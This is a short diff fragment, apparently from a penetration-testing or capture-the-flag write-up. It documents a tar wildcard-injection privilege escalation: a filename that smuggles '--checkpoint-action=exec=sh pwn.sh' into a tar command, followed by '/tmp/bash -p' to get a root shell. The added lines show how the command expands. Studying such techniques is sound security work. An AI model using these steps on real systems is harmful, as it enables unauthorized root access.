@@ -506,4 +506,7 @@ touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
 touch /tmp/backup.tar.gz
 
 /tmp/bash -p
+
+The Actual Bash Interpretation:
+/opt/admin: tar -zxf /tmp/backup.tar.gz --checkpoint-action=exec=sh pwn.sh  --checkpoint=1  pwn.sh
 ```
